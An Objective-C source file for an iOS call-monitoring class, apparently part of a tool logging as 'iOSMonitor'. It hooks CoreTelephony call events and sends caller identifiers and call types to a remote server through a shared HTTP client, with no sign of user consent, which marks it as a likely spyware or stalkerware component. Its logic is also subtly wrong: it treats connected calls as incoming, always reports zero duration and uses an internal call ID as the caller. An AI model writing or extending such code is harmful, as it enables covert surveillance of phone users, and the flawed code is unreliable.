#import "include/monitor.h"
@import CoreTelephony;

@interface CallMonitor ()
@property (nonatomic, strong) CTCallCenter *callCenter;
@end

@implementation CallMonitor

- (void)start {
    self.callCenter = [[CTCallCenter alloc] init];
    self.callCenter.callEventHandler = ^(CTCall *call) {
        NSString *callerID = call.callID ?: @"Unknown";
        NSString *state = call.callState;

        NSString *type = @"unknown";
        if ([state isEqualToString:CTCallStateConnected]) type = @"incoming";
        else if ([state isEqualToString:CTCallStateDialing]) type = @"outgoing";
        else if ([state isEqualToString:CTCallStateDisconnected]) type = @"ended";

        [[HTTPClient sharedClient] post:@"call" params:@{
            @"caller_id": callerID,
            @"duration": @0,
            @"call_type": type
        }];
        NSLog(@"[iOSMonitor] Call: %@ (%@)", callerID, type);
    };
    NSLog(@"[iOSMonitor] CallMonitor started");
}

@end
